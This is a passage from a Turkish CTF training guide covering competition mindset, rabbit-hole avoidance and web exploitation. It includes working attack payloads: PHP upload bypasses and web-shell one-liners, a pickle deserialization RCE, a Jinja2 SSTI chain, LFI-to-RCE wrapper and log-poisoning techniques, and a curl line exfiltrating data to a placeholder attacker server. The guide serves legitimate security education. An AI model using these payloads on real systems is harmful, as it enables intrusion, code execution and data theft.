# CTF MASTERCLASS: SIFIRDAN OPERATÖRLİĞE MUTLAK REHBEr
## Dünyanın En Prestijli CTF Takımlarının Sırları: Tam Teşekküllü Savaş Kılavuzu

> *"CTF'te kazanan, en çok bilen değil, en hızlı tanıyan ve en az vakit harcayandır."*  
> — DEF CON CTF Şampiyonu, Kimliği Gizli Operatör

---

## İÇİNDEKİLER

1. [BÖLÜM 1: CTF Felsefesi, Vizyon ve Saldırgan Psikolojisi](#bölüm-1-ctf-felsefesi-vizyon-ve-saldırgan-psikolojisi)
2. [BÖLÜM 2: Kategorisel "Gör-ve-Vur" Taktikleri](#bölüm-2-kategorisel-gör-ve-vur-taktikleri)
3. [BÖLÜM 3: Hız Kazanma Sanatı - Operasyonel Verimlilik](#bölüm-3-hız-kazanma-sanatı---operasyonel-verimlilik)
4. [BÖLÜM 4: Öğrenme Psikolojisi ve Zihinsel Dayanıklılık](#bölüm-4-öğrenme-psikolojisi-ve-zihinsel-dayanıklılık)
5. [BÖLÜM 5: Gelecek Vizyonu - 2024-2026 ve Ötesi](#bölüm-5-gelecek-vizyonu---2024-2026-ve-ötesi)
6. [BÖLÜM 6: Silahlanma - Savaş Aletleri ve Kullanım Kılavuzları](#bölüm-6-silahlanma---savaş-aletleri-ve-kullanım-kılavuzları)

---

# BÖLÜM 1: CTF Felsefesi, Vizyon ve Saldırgan Psikolojisi

## 1.1 Yaratıcının Tembellik Kanunu: Kusursuz Kodun Olmadığı Yerleri Koklama Sanatı

### Vizyon: Neden Bu Önemli?

Bir CTF sorusuna baktığında, karşındaki aslında bir insan. Ve bu insan - ne kadar iyi olursa olsun - kısıtlı zaman altında o challenge'ı hazırladı. Belki de sabahın 4'ünde, kafein mahmurluğu içinde, son teslim tarihine 2 saat kala.

**İşte sihir burada başlar:** Her insan, baskı altında kısayollar alır. Bu kısayollar senin zafiyet haritandır.

### Mantık: İnsan Beyni Nasıl Hata Yapar?

Bilişsel psikolojide "attentional blindness" (dikkat körlüğü) denen bir kavram vardır. Beyin bir problemi çözerken, çözümün %80'ine odaklanır ve %20'sini "zaten bunu herkes bilir, kontrol etmeye gerek yok" diyerek ihmal eder.

**Challenge yaratıcısının ihmal ettiği %20'ler:**

```
┌─────────────────────────────────────────────┐
│  YARATICININ DİKKAT HARİTASI                │
├─────────────────────────────────────────────┤
│  [█████████████████░░░░] Ana Mantık (%80)   │
│  [░░░░░░░░░░░░░░░░░░░░] Input Validation    │
│  [░░░░░░░░░░░░░░░░░░░░] Error Messages      │
│  [░░░░░░░░░░░░░░░░░░░░] Edge Cases          │
│  [░░░░░░░░░░░░░░░░░░░░] Race Conditions     │
└─────────────────────────────────────────────┘
```

### Teknik: Yaratıcının Zihnini Okuma Protokolü

İşte challenge hazırlayan birinin zihnindeki varsayımları kırmanın sistematik yolu:

**ADIM 1: Varsayım Haritası Çıkarma (30 saniye)**

```python
def analiz_et_challenge(kod):
    """Her challenge'da sorulacak 7 temel soru"""
    
    sorular = {
        "Input Nereden Geliyor?": ["URL param", "POST body", "Cookie", "Header", "JSON"],
        "Sanitizasyon Nerede?": ["Fonksiyon başı", "Fonksiyon sonu", "Hiç yok"],
        "Hata Mesajları Ne Sızdırıyor?": ["Stack trace", "SQL hatası", "File path"],
        "Hangi Dil/Framework?": ["PHP", "Python Flask", "Node.js", "Go"],
        "Hangi Versiyonlar?": ["PHP 5.x (eski)", "PHP 7.x", "PHP 8.x"],
        "Default Config Mi?": ["Debug açık mı", "Error reporting full mu"],
        "Test Edilmemiş Durumlar?": ["Çok uzun input", "Özel karakterler", "NULL byte"]
    }
    
    # Her soru için zihinsel checklist yap
    return sorular
```

**ADIM 2: "Zaten Kimse Buraya Bakmaz" Noktaları**

Challenge yaratıcılarının %90'ı şu noktaları kontrol etmez:

| Nokta | Yaratıcının Düşüncesi | Gerçek |
|-------|----------------------|--------|
| HTTP Header'lar | "Kimse X-Forwarded-For ile uğraşmaz" | Sen uğraş, SSRF bulursun |
| Dosya uzantısı büyük/küçük harf | "upload.php yasakladım yeter" | Upload.Php, upload.pHp dene |
| NULL byte (%00) | "PHP 5.3'ten beri yok bu açık" | Eski sunucu olabilir, her zaman dene |
| İkinci parametre | "?id= parametresini korudum" | ?id=1&debug=true var mı bak |
| Alternate encoding | "' karakterini engelledim" | %27, %2527, %u0027, \x27 dene |
| Race condition | "Kimse milisaniye hassasiyetinde saldırmaz" | Burp Intruder ile dene |
| Integer overflow | "Zaten MAX_INT'e ulaşmaz" | 2147483647 + 1 = -2147483648 |

**ADIM 3: Gerçek Dünya Örneği - File Upload Zafiyeti**

Klasik bir PHP dosya yükleme challenge'ını ele alalım:

```php
<?php
// Yaratıcının yazdığı "güvenli" kod
$allowed_ext = ['jpg', 'png', 'gif'];
$filename = $_FILES['upload']['name'];
$ext = pathinfo($filename, PATHINFO_EXTENSION);

if (in_array($ext, $allowed_ext)) {
    move_uploaded_file($_FILES['upload']['tmp_name'], 'uploads/' . $filename);
    echo "Dosya yüklendi!";
} else {
    die("Sadece resim dosyaları!");
}
?>
```

**Yaratıcının varsayımı:** "Uzantıyı kontrol ettim, güvenli."

**Gerçek:** En az 12 farklı bypass yöntemi var:

```bash
# Bypass Yöntem 1: Çift uzantı
shell.php.jpg

# Bypass Yöntem 2: NULL byte (eski PHP)
shell.php%00.jpg

# Bypass Yöntem 3: Büyük/küçük harf
shell.PhP

# Bypass Yöntem 4: Alternatif PHP uzantıları
shell.php3
shell.php4
shell.php5
shell.phtml
shell.phar

# Bypass Yöntem 5: MIME type manipulation
# Content-Type: image/jpeg 
# Ama içerik: <?php system($_GET['cmd']); ?>

# Bypass Yöntem 6: .htaccess upload
# İçerik: AddType application/x-httpd-php .jpg
# Sonra: shell.jpg yükle (PHP olarak çalışır)

# Bypass Yöntem 7: Dosya adında dizin geçişi
../shell.php

# Bypass Yöntem 8: Unicode karakter
shell.ph\u0070  (p karakterinin Unicode'u)

# Bypass Yöntem 9: Boşluklar ve nokta
shell.php.....  (Windows'ta son noktalar silinir)
shell.php       (sonunda boşluk)

# Bypass Yöntem 10: Case insensitive filesystems
shell.PhP (Windows'ta php olarak çalışır)

# Bypass Yöntem 11: Alternate data stream (Windows)
shell.jpg::$DATA
shell.php::$DATA

# Bypass Yöntem 12: Polyglot file (hem geçerli resim hem PHP)
# GIF header + PHP kodu:
GIF89a<?php system($_GET['cmd']); ?>
```

### Derin Felsefi İçgörü: Yaratıcının Bakış Açısını Çözmek

Challenge yaratıcısı şunu düşünür: "Ben bu açığı koymak istiyorum, ama çok kolay olmasın."

Bu cümledeki gizli ipucu: **Açık oradadır, ama bir katman arkasında.**

Örnek:
- SQL Injection açığı var MIdir? → EVET
- Direkt `' OR '1'='1` çalışır mı? → HAYIR (filtre var)
- Peki ya encoding ile? → EVET (filtreyi bypass eder)

**Altın Kural:** Challenge yaratıcısı senin 3 deneme yapmanı bekler. 4. denemede başarılı olacaksın. O yüzden ilk 2 deneme başarısız olduğunda pes etme, yaratıcının planı bu.

---

## 1.2 Rabbit Hole (Tavşan Deliği) Analizi: Çıkmaz Sokağı 120 Saniyede Tespit Etme

### Vizyon: Rabbit Hole Nedir ve Neden Öldürücüdür?

Rabbit hole, bir ipucunun arkasına düşüp saatlerce boşa vakit harcamandır. CTF'te zamanın paradır. 45 dakika yanlış yolda harcamak, 3 kolay soruyu kaçırmak demektir.

**Psikolojik Tuzak:** Beynin "sunk cost fallacy" (batık maliyet yanılgısı) dedikleri şeye girer. "30 dakika harcadım, şimdi bırakırsam hepsi boşa gider" diye düşünürsün. Ama gerçek şu: **Yanlış yola 30 dakika harcadıysan, 31. dakikada durmalısın, 60. dakikada değil.**

### Mantık: Rabbit Hole'un Matematiksel İmzası

Bir çalışma yolu "tavşan deliği" ise, şu özellikleri taşır:

```
┌──────────────────────────────────────────┐
│  RABBIT HOLE BELİRTİLERİ                 │
├──────────────────────────────────────────┤
│  ☑ Çaba/İlerleme Oranı: < 0.2            │
│     (30 dakika harcadın, %10 ilerledin)  │
│                                          │
│  ☑ Belirsizlik Endeksi: > 0.7            │
│     (Ne yapacağını %70 bilmiyorsun)      │
│                                          │
│  ☑ Kaynak Sayısı: = 0                    │
│     (Google'da benzer çözüm yok)         │
│                                          │
│  ☑ Hata Mesajı Çeşitliliği: > 5          │
│     (5+ farklı hata görüyorsun)          │
│                                          │
│  ☑ "Belki Bu..." Sayısı: > 10            │
│     (10+ farklı yaklaşım deniyorsun)     │
└──────────────────────────────────────────┘
```

### Teknik: 2-Dakika Rabbit Hole Tespit Algoritması

**KONTROL NOKTASI 1: 30 Saniye - Netlik Testi**

```python
def netlik_testi():
    """Challenge'a bakar bakmaz kendin için yanıtla"""
    
    sorular = {
        "Açığın yerini biliyor musun?": "EVET/HAYIR",
        "Hangi payload'u deneyeceğini biliyor musun?": "EVET/HAYIR",
        "Başarı kriterini biliyor musun?": "EVET/HAYIR"
    }
    
    # 3'ü de HAYIR ise → Recon eksik, hemen recon'a dön
    # 2'si HAYIR ise → Daha fazla araştır
    # 1'i HAYIR ise → Devam et
    # Hepsi EVET ise → Full speed ahead!
```

**KONTROL NOKTASI 2: 1 Dakika - İlerleme Ölçümü**

```
İlk 60 saniyede elde etmen gerekenler:
✓ En az 1 çalışan HTTP request
✓ En az 1 hata mesajı (bilgi sızıntısı olabilir)
✓ En az 1 input noktası keşfetmek

Bunlar yoksa → Yaklaşımın yanlış, pivotla
```

**KONTROL NOKTASI 3: 2 Dakika - Pivot Kararı**

```python
def pivot_karari_ver(sure_harcanan, ilerleme_yuzdesi):
    """Devam mı, pivotla mı?"""
    
    verimlilik = ilerleme_yuzdesi / sure_harcanan
    
    if verimlilik < 0.3:  # Dakikada %30'dan az ilerleme
        return "PIVOT - Başka yaklaşım dene"
    elif verimlilik < 0.5:
        return "DEVAM AMA HIZLAN - Daha agresif ol"
    else:
        return "DEVAM - İyi gidiyorsun"
```

### Gerçek Dünya Örneği: Rabbit Hole'dan Kaçış

**Senaryo:** Bir web challenge'ında SQL Injection arıyorsun. 30 dakika boyunca onlarca payload denedin, hiçbiri çalışmadı.

**Rabbit Hole İşaretleri:**
```
✗ Defalarca aynı hatayı görüyorsun
✗ Payload'ları Google'dan kopyala-yapıştır yapıyorsun
✗ "Acaba şu karakteri encode etsem?" diye sonsuz varyasyon deniyorsun
✗ İçinde SQLi olduğuna eminsin ama kanıt yok
```

**Çıkış Stratejisi:**

```bash
# ADIM 1: Varsayımlarını sorgula (30 saniye)
echo "Gerçekten SQLi var mı? Başka açık türü olabilir mi?"

# ADIM 2: Başka input noktalarına bak (1 dakika)
# URL'deki ?id= yerine:
# - Cookie değerleri
# - User-Agent header
# - Referer header
# - JSON POST body
# - XML POST body

# ADIM 3: Başka zafiyet kategorisine geç (1 dakika)
# SQLi yerine:
# - XSS dene
# - Command Injection dene
# - LFI/RFI dene
# - IDOR dene

# ADIM 4: Challenge açıklamasını tekrar oku (30 saniye)
# Belki de ipucu görmemişsindir
```

**30 Dakika vs 3 Dakika Farkı:**

```
Acemi yaklaşım (30 dakika):
├─ SQLi payload #1 → Hata
├─ SQLi payload #2 → Hata
├─ SQLi payload #3 → Hata
├─ ... (27 dakika daha aynı şey)
└─ Pes et, başka soruya geç

Champion yaklaşım (3 dakika):
├─ SQLi payload #1 → Hata
├─ SQLi payload #2 → Hata
├─ [2 DAKİKA SINIRI] Pivot!
├─ Cookie'ye SQLi dene → Çalıştı!
└─ 3 dakikada çözüldü
```

### Derin İçgörü: "Sezgi Hileleri" - Pattern Recognition'ın Ötesi

Seneler süren CTF tecrübesi, bir "6. his" geliştirir. İşte o hisin formüle dökülmüş hali:

**Sezgi Kuralı 1: Point/Solve Oranı**

```python
def zorluk_tahmini(puan, cozum_sayisi, gecen_sure_saat):
    """Challenge gerçekten zor mu, yoksa insanlar mı tavşan deliğinde?"""
    
    beklenen_cozum = (gecen_sure_saat / 1) * 10  # Saatte ~10 çözüm
    
    if cozum_sayisi < beklenen_cozum * 0.3:
        return "RABBIT HOLE ALARMI - İnsanlar takılıyor, sen de takılabilirsin"
    elif puan > 500 and cozum_sayisi < 5:
        return "GERÇEKTEN ZOR - Ama çözülebilir"
    else:
        return "NORMAL ZORLUK - Devam et"
```

**Sezgi Kuralı 2: Hata Mesajı Çeşitliliği Paradoksu**

```
Eğer 10+ farklı hata mesajı görüyorsan:
→ Ya çok yakınsın (her denemen farklı kısımda bug tetikliyor)
→ Ya da çok uzaksın (random şeyler deniyorsun)

Nasıl anlarsın?
→ Hata mesajları birbiriyle alakalı mı?
   EVET → Yakınsın, devam et
   HAYIR → Uzaksın, pivotla
```

**Sezgi Kuralı 3: Challenge Yazarı Kim?**

```bash
# Challenge açıklamasına bak, yazarın adını gör
# O kişinin geçmiş challengelarına bak (CTFtime.org)

# Eğer yazar hep "gizli flag location" tarzı sorular yazıyorsa:
→ Forensics/Steganography ağırlıklı düşün

# Eğer yazar hep "custom crypto" challengeları yazıyorsa:
→ z3 solver kullanman gerekecek, matematik ağırlıklı

# Bu bilgi sana yöntem seçiminde 10 dakika kazandırır
```

---

## 1.3 Bilinmezlik Algoritması: Hiç Görmediğin Bir Açığa Nasıl Yaklaşırsın?

### Vizyon: Bilinmeyenin Korkusu vs. Bilinmeyenin Keşfi

CTF'te karşına çıkacak şeyler:
- Daha önce duymadığın bir framework (örn: "Tauri" framework'ünde RCE)
- Hiç kullanmadığın bir dil (örn: Rust, Kotlin, Elixir)
- Yeni bir açık türü (örn: "Server-Side Prototype Pollution")

**Panik anı:** "Ben bunu bilmiyorum, çözemem."
**Şampiyon anı:** "Ben bunu bilmiyorum, ama 5 dakikada öğrenirim."

Aradaki fark: **Öğrenme algoritması.**

### Mantık: Beynin Hızlı Öğrenme Modu

Bilişsel bilimde "destek iskelesi" (scaffolding) denen bir kavram var. Yeni bilgiyi, mevcut bilgine bağlayarak öğrenirsin.

**Örnek:**
- "Pickle Deserialization" bilmiyorsun
- Ama "Object deserialization" biliyorsun (Java'dan)
- Bağlantı: İkisi de serialize edilmiş objeyi açarken kod çalıştırma riski taşır
- Sonuç: 2 dakikada Pickle exploitini anlarsın

### Teknik: 5 Dakikalık Acil Öğrenme Protokolü

**FAZ 1: Hiper-Hızlı Kontekst Toplama (90 saniye)**

```bash
# 3 tarayıcı sekmesi aç, paralel araştır:

# SEKME 1: Saldırı PoC ara
https://github.com/search?q=[TEKNOLOJİ_ADI]+exploit+CVE

# SEKME 2: HackerOne/Bugcrowd raporları ara
https://hackerone.com/reports?q=[TEKNOLOJİ_ADI]

# SEKME 3: Exploit-DB ara
https://www.exploit-db.com/search?q=[TEKNOLOJİ_ADI]
```

**Amaç:** Teorik açıklama DEĞİL, çalışan kod örneği bul. Açıklamayı sonra okursun.

**FAZ 2: Minimum Viable Payload Çıkarma (2 dakika)**

İlk bulduğun exploit kod örneğini al. Oku ama tamamını anlama, sadece şunu bul:

```python
# Örnek: Bir Python Pickle exploit buldum

import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat flag.txt',))

payload = pickle.dumps(Exploit())
# payload'u gönder
```

**Çıkardığın bilgiler (sırayla önem derecesine göre):**

1. **Tetikleme mekanizması:** `pickle.loads()` çağrısı tetikliyor
2. **Payload yapısı:** `__reduce__` methodu otomatik çalışıyor
3. **Saldırı primitive'i:** Rastgele Python kodu çalıştırabilirim

Şimdi 3 satırda öğrendin: Pickle deserialization nasıl exploit edilir?

**FAZ 3: Challenge'a Adapte Etme (90 saniye)**

```python
# Generic template'i al, challenge'a adapte et:

class RCE:
    def __reduce__(self):
        return (os.system, ('cat /home/ctf/flag.txt',))  # Flag path'i değiştir

# Eğer base64 encode gerekiyorsa:
import base64
b64_payload = base64.b64encode(pickle.dumps(RCE()))

# Eğer URL encode gerekiyorsa:
import urllib.parse
url_payload = urllib.parse.quote(pickle.dumps(RCE()))

# Challenge'ın input formatına göre gönder
```

**FAZ 4: Doğrulama ve İterasyon (60 saniye)**

```bash
# Test 1: Basit komut çalışıyor mu?
payload = RCE_with_command('whoami')
# Çıktı var mı kontrol et

# Test 2: Flag okuyabiliyor musun?
payload = RCE_with_command('cat flag.txt')

# Test 3: Output gelmiyor mu? Blind exfiltration dene
payload = RCE_with_command('curl http://SENIN_SUNUCUN.com/$(cat flag.txt)')
```

**Toplam süre:** 5 dakika. Sıfırdan yeni bir açığı öğrendin ve exploit ettin.

### Gerçek Dünya Örneği: SSTI (Server-Side Template Injection) - Sıfırdan Öğrenme

Diyelim ki daha önce SSTI duymadın. Challenge açıklamasında "Flask template" görüyorsun.

**Adım Adım Keşif:**

```bash
# 1. SSTI nedir, 10 saniyelik araştırma
# Google: "SSTI exploit" → İlk link: PortSwigger
# Özet: Template engine'e user input verdiğinde, template syntax çalışır

# 2. Flask hangi template engine kullanır?
# Cevap: Jinja2

# 3. Jinja2 SSTI payload'u nedir?
# GitHub'dan ilk bulduğun örnek:
{{7*7}}  # Eğer 49 dönerse, SSTI var

# 4. RCE'ye nasıl yükseltilir?
# Bulduğun payload:
{{ ''.__class__.__mro__[1].__subclasses__() }}  # Python classlarını listele

# 5. Hangi class işe yarar?
# subprocess.Popen veya os._wrap_close gibi classlar

# 6. Son payload:
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['popen']('cat flag.txt').read() }}
```

**Toplam öğrenme süresi:** 5 dakika  
**Geleneksel öğrenme süresi:** 2-3 saat (dokümantasyon okuyarak)  
**Kazanılan zaman:** 2 saat 55 dakika

### Derin İçgörü: "Transfer Learning" - Bilgiyi Transfer Etme Sanatı

CTF'te her yeni teknoloji aslında eski bir teknolojinin kılık değiştirmiş hali:

| Yeni Teknoloji | Eski Eşdeğeri | Transfer Edilen Bilgi |
|---------------|---------------|----------------------|
| GraphQL Injection | SQL Injection | Query manipulation, union attacks |
| JWT Algorithm Confusion | Type confusion bugs | Object type değiştirme |
| SSRF via PDF | XXE via XML | External resource fetching |
| Prototype Pollution (JS) | Type confusion | Object property manipulation |
| CRLF Injection | Header injection | Line break kullanarak bypass |

**Pratik Kullanım:**

```
Yeni challenge: "GraphQL API manipulation"

Zihinsel süreç:
1. GraphQL = Database query language
2. SQL Injection bildim
3. Transfer: SQL'deki union, where, order by → GraphQL'de nasıl?
4. Google: "GraphQL injection cheatsheet"
5. Bulundu: __schema introspection, mutation without auth
6. Çözüldü: 3 dakika
```

### Meta-Bilişsel Strateji: Kendi Öğrenme Hızını Ölçme

```python
def ogrenme_hizi_analizi():
    """Bilinmeyen bir konuyu kaç dakikada öğreniyorsun?"""
    
    # Şu anda ölç:
    baslangic_zamani = time.time()
    
    # Yeni bir CTF açık türü öğren (örn: XXE - External Entity)
    # Sadece Google + GitHub + ilk exploit
    
    bitis_zamani = time.time()
    sure = (bitis_zamani - baslangic_zamani) / 60  # Dakika
    
    if sure < 3:
        return "ELITE seviye - Öğrenme algoritman mükemmel"
    elif sure < 7:
        return "İYİ seviye - Biraz daha hızlanabilir"
    elif sure < 15:
        return "ORTA seviye - Daha fazla pratik lazım"
    else:
        return "YAVAŞ - Öğrenme stratejini gözden geçir"
```

**Hedef:** Her yeni konu için öğrenme süresini kısaltmak. İlk keresinde 15 dakika süren, 10. keresinde 3 dakikaya düşmeli.

---

## 1.4 Meta-Biliş Katmanı: Düşüncen Hakkında Düşünmek

### Vizyon: Profesyoneli Acemiden Ayıran Şey

Amatör: "Bu exploit çalışmıyor, başka bir şey deneyeyim."
Profesyonal: "Bu exploit çalışmıyor. Dur, neden çalışmıyor? Varsayımlarımdan hangisi yanlış?"

Fark, **düşünce sürecini izleme** yeteneğinde.

### CTF'te Bilinç Seviyeleri

**Seviye 1: Teknik Yürütme (Acemilerin seviyesi)**
- "SQL Injection nasıl yapılır biliyorum"
- "Buffer overflow exploit yazabilirim"

**Seviye 2: Pattern Recognition (İyi oyuncuların seviyesi)**
- "Bu input noktası injection'a açık, tanıyorum"
- "Bu binary'de hangi aracı kullanacağımı biliyorum"

**Seviye 3: Stratejik Farkındalık (Şampiyonların seviyesi)**
- "Bu soruyu çözmek 45 dakika alır, ama şu anda takımda daha değerli hedefler var"
- "Leaderboard'a baktım, herkes bu soruyu çözmüş, bu kolay demek, öncelik ver"
- "6. saatteyiz, beyin yorgunluğu var, karmaşık crypto yerine kolay web sorularına geç"

**Seviye 4: Meta-Stratejik Öngörü (Efsane seviyesi)**
- "Bu CTF'nin organizatörleri geçen sene X tarzı sorular sormuş, bu sene de benzer olacak"
- "Şu challenge'ın write-up'ını yarın okuyacağım, bugün görmemişken zihnimde çözelim"
- "Takım psikolojisi: 8. saatte morale boost lazım, basit bir çözüm bulup herkesi motive edelim"

### Teknik: Gerçek Zamanlı Zihinsel Dashboard

CTF sırasında zihninde şu dashboard'u tut:

```
╔════════════════════════════════════════════════════════╗
║  ZİHİNSEL DURUM PANELİ (Her 30 dakikada güncelle)     ║
╠════════════════════════════════════════════════════════╣
║  Kalan Süre: 6 saat 45 dakika                         ║
║  Takım Sırası: 8. (↑ 12.'den yükseldi)                ║
║  Enerji Seviyem: 7/10 (Kafeinin etkisi azalıyor)      ║
║  Odak Kalitesi: 8/10 (Hala iyiyim)                    ║
╠════════════════════════════════════════════════════════╣
║  AKTİF CHALLENGE DURUMU:                               ║
║  [████████░░] Web - SQL Bypass (80% - Yakın)          ║
║  [███░░░░░░░] Pwn - Heap (30% - Orta mesafe)          ║
║  [DURDURULDU] Crypto - RSA (Tavşan deliği tespit)     ║
╠════════════════════════════════════════════════════════╣
║  STRATEJİK KARAR:                                      ║
║  ► 15 dakika Web'e focus, %80'den %100'e çıkar        ║
║  ► Sonra 10 dk mola (beyin temizleme)                  ║
║  ► Pwn'e dön, farklı approach dene                     ║
║  ► Crypto'yu sadece takım arkadaşı çözebilirse bak     ║
╠════════════════════════════════════════════════════════╣
║  PSİKOLOJİK NOTLAR:                                    ║
║  ⚠ Frustrasyon testi: 6/10 (Dikkat, burnout yakın)    ║
║  ✓ Çözüm sayısı: 7 (Motivasyon hala yüksek)           ║
║  ⚠ Son 1 saatte çözüm yok (Yaklaşım değiştir)         ║
╚════════════════════════════════════════════════════════╝
```

### Pratik Egzersiz: "Düşünce Hataları" Günlüğü

Her CTF'ten sonra, şu soruları kendin için yanıtla:

```markdown
## CTF Post-Mortem (Olay Sonrası Analiz)

### Başarılı Olduğum Şeyler
1. X sorusunda pattern'i 30 saniyede tanıdım
2. Y sorusunda tavşan deliğinden 5 dakikada çıktım
3. Z sorusunda bilinmeyen teknolojiyi hızlı öğrendim

### Hata Yaptığım Noktalar
1. A sorusunda 45 dakika harcadım, pivot etmeliydim
2. B sorusunda error mesajını okumadım, 10 dakika kaybettim
3. C sorusunda tool'a çok güvendim, manual denemeliydim

### Öğrendiğim Yeni Pattern'ler
1. PHP'de .phar uzantısı da çalışıyormuş
2. JWT'de "none" algorithm bypass'ı varmış
3. SQL'de --+ ile -- arasında fark varmış (URL encoding)

### Bir Dahaki Sefere Yapacaklarım
1. İlk 10 dakikada tüm input noktalarını listeleyeceğim
2. 30 dakika sonra mutlaka progress check yapacağım
3. Farklı encoding'leri otomatik deneyen script yazacağım
```

### Derin İçgörü: "Bilişsel Yük Yönetimi" - Beynini Optimize Et

CTF bir maraton, sprint değil. Beynin 8 saat boyunca %100 performans gösteremez.

**Enerji Dalgası Stratejisi:**

```
Saat 0-2: FULL FOCUS
├─ En zor challenge'lara yüklen
├─ Kreativite zirvede
├─ Mola verme, akışta kal
└─ Hedef: 3-4 çözüm

Saat 2-4: YAVAŞLAMA BAŞLIYOR
├─ Orta zorlukta challenge'lara geç
├─ 5 dakikalık mikro-molalar ver
├─ Su iç, ayağa kalk
└─ Hedef: 2-3 çözüm

Saat 4-6: İLK YORGUNLUK DALGASI
├─ Kolay/orta challenge'lara focus
├─ "Quick win" ara, moral için
├─ 15 dakikalık gerçek mola (yürü)
├─ Eğer takım varsa: Görev değiş
└─ Hedef: 1-2 çözüm

Saat 6-8: KRİTİK KARAR
├─ Solo isen: 30-45 dk power nap (uyku)
├─ Takım isen: Nöbet usulü dinlenme
├─ Uyumazsan: Sadece mekanik işler
└─ Hedef: Enerjiyi recover et

Saat 8-10: İKİNCİ NEFES
├─ Enerji geri geldi
├─ Zor challenge'lara tekrar dön
├─ Fresh perspektif = çözüm
└─ Hedef: 2-3 çözüm (saat 4'te takılan çöz)

Saat 10-12: FİNAL SPRINT
├─ Adrenalin taşıyor
├─ Risk al, agresif ol
├─ Yarım kalmış challengelara dön
└─ Hedef: Maksimum puan
```

---

# BÖLÜM 2: Kategorisel "Gör-ve-Vur" Taktikleri

## 2.1 Web Exploitation: HTTP Savaş Alanı

### Vizyon: Web, En Verimli Puan Kaynağı

İstatistikler şunu söylüyor: CTF'lerde çözülen soruların %40'ı web kategorisinde. Neden? Çünkü:
- Hızlı test edilir (tarayıcı + Burp = instant feedback)
- Toollar çok gelişmiş (sqlmap, nikto, dirb)
- Pattern'ler tekrar eder (her CTF'te SQLi vardır)

**Altın Kural:** Web kategorisine hakim ol, her CTF'te garanti puan kaparsın.

### İşaret Fişekleri: Gördüğün An Teşhis Et Tablosu

| URL/Kod İşareti | Anında Düşün | İlk Aksiyon | Başarı Süresi |
|-----------------|--------------|-------------|---------------|
| `?page=`, `?file=`, `?path=`, `?lang=` | **LFI/RFI** | `?page=../../../../etc/passwd` | 10 saniye |
| `?id=123`, `?user=5`, `?product=8` | **SQLi (Numeric)** | `?id=123'` veya `?id=123-0` | 5 saniye |
| `?name=admin`, `?search=test` | **SQLi (String)** | `?name=admin'--` | 5 saniye |
| `<input>` tag'i HTML'de görünür | **XSS** | `<script>alert(1)</script>` | 15 saniye |
| `eval()`, `system()`, `exec()`, `shell_exec()` | **RCE** | Command injection payloadları | 20 saniye |
| `{{`, `{%`, `#{` template syntax | **SSTI** | `{{7*7}}`, `#{7*7}` | 10 saniye |
| XML parser kullanıyor | **XXE** | External entity payload | 30 saniye |
| Dosya upload fonksiyonu | **Unrestricted Upload** | PHP shell upload | 45 saniye |
| JWT token (cookie/header) | **JWT Exploit** | "none" algorithm dene | 30 saniye |
| `Access-Control-Allow-Origin: *` | **CORS Misconfiguration** | Cross-origin req test | 20 saniye |
| `.git` directory bulunur | **Git Info Disclosure** | GitDumper ile repo çek | 2 dakika |
| `phpinfo()` sayfası açık | **Info Disclosure** | disable_functions, expose_php kontrol | 1 dakika |
| `debug=true` parametresi | **Debug Mode Enabled** | Hata mesajlarını tetikle | 30 saniye |

### 2.1.1 LFI (Local File Inclusion): Dosya Okuma Sanatının İncelikleri

#### Mantık: LFI Nasıl Oluşur?

```php
// SAVUNMASIZ KOD
<?php
$page = $_GET['page'];
include($page . ".php");  // Kullanıcı inputu direkt include'a gidiyor
?>

// Saldırgan ne yapar?
?page=../../../../etc/passwd
// Sonuç: include("../../../../etc/passwd.php")
// PHP, .php uzantısını son eklediği için /etc/passwd okuyamaz
// Ama null byte ile: ?page=../../../../etc/passwd%00
// Sonuç: include("../../../../etc/passwd\0.php")
// Null byte sonrasını keser, /etc/passwd okunur (PHP < 5.3.4)
```

#### İleri Seviye LFI: PHP Wrapper Kullanımı

```bash
# Technique 1: Base64 Encoding ile Source Code Okuma
?page=php://filter/convert.base64-encode/resource=index

# Ne oluyor?
# include() PHP wrapper'ını çalıştırıyor
# index.php'nin içeriğini base64 encode edip basıyor
# Sen decode et → Source code görmüş olursun

# Technique 2: Data Wrapper ile RCE
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
# Bu base64: <?php system($_GET['cmd']); ?>
# URL'e &cmd=cat flag.txt ekle → RCE!

# Technique 3: Zip Wrapper ile Payload Upload
# 1. Zip dosyası oluştur: shell.php'yi zip'le
# 2. Upload et (image upload olarak)
# 3. Erişim: ?page=zip://uploads/image.jpg%23shell
# %23 = # (URL encoded), zip içindeki dosyaya erişim

# Technique 4: Log Poisoning (Log Dosyasını Zehirleme)
# Adım 1: Apache log'a PHP kodu enjekte et
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com

# Adım 2: Log dosyasını include et
?page=../../../../var/log/apache2/access.log&cmd=cat flag.txt

# Technique 5: Session File Poisoning
# Adım 1: Session'a PHP kodu yaz
# Cookie: PHPSESSID=abc123
# Session file: /var/lib/php/sessions/sess_abc123
# Page'e: <?php system('cat flag.txt'); ?> yazdır

# Adım 2: Session file'ı include et
?page=../../../../var/lib/php/sessions/sess_abc123

# Technique 6: /proc/self/environ Exploitation
?page=../../../../proc/self/environ
# Environment variables içinde User-Agent var
# User-Agent'i zehirle, environ'ı include et
```

#### LFI'dan RCE'ye Yükselme Yolları

```bash
# Yol 1: PHP Wrapper ile direkt RCE (en hızlı)
?page=data://text/plain,<?php system('cat flag.txt'); ?>

# Yol 2: /proc/self/environ ile RCE
# User-Agent: <?php system($_GET['c']); ?>
?page=../../../../proc/self/environ&c=cat flag.txt

# Yol 3: Log poisoning ile RCE
# Yukardaki örnekte gösterildi

# Yol 4: Upload + Include
# Shell upload et → Include ile tetikle

# Yol 5: PHP Session ile RCE
# Session'a kod yaz → Include et

# Yol 6: /proc/self/fd/ ile RCE (advanced)
?page=../../../../proc/self/fd/10
# File descriptor üzerinden upload buffer'ını include et
```

#### God-Mode LFI Aracı: Otomatik Fuzzer

```bash
# FFuf ile LFI wordlist fuzzing
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
     -u "http://target.com/index.php?page=FUZZ" \
     -mc 200 \
     -fw 1 \
     -t 100

# Açıklama:
# -w: 900+ LFI payload içeren wordlist
# -mc 200: Sadece 200 OK dönen requestler
# -fw 1: 1 kelimelik response'ları filtrele (error pagelar)
# -t 100: 100 thread (hız için)

# Alternatif: wfuzz ile
wfuzz -w lfi-wordlist.txt \
